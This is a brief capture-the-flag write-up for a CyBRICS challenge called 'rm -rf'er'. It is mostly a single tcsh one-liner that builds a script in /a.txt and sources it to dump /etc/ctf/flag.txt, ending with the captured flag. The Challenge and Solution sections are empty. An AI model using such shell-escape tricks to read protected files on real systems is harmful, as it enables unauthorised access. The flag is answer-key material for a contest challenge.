# rm -rf'er

## Challenge

## Solution

## Payload

```sh
echo "set line=("`echo '$'`"<)" > /a.txt; echo "echo "`echo '$'`"line" >> /a.txt; source /a.txt < /etc/ctf/flag.txt
```

## Flag

`cybrics{TCSHizzl3_Ma_N1zzl3}`

